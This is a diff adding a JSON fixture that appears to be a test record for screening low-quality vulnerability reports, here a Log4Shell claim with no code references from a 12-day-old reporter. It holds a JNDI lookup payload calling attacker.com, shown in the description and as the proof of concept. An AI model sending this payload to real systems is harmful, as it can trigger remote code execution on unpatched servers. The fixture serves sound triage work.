@@ -1,0 +1,14 @@
+{
+  "id": "slop-002",
+  "source": "github",
+  "title": "Remote code execution via Log4Shell (CVE-2021-44228)",
+  "description": "Your project is vulnerable to the Log4Shell vulnerability CVE-2021-44228. An attacker can send a crafted JNDI lookup string such as ${jndi:ldap://attacker.com/a} that gets evaluated and leads to remote code execution. This is the same critical vulnerability that affected Apache Log4j. Please patch immediately by upgrading log4j-core to 2.17.0 or later.",
+  "claimed_affected_versions": ["< 2.17.0"],
+  "claimed_severity": "critical",
+  "claimed_cwe": ["CWE-502"],
+  "code_references": [],
+  "poc_present": true,
+  "poc_text": "${jndi:ldap://attacker.com/a}",
+  "reporter": {"handle": "bughunter-x", "account_age_days": 12, "prior_credited_advisories": 0, "submission_velocity_30d": 41},
+  "received_at": "2026-01-30T15:10:00Z"
+}
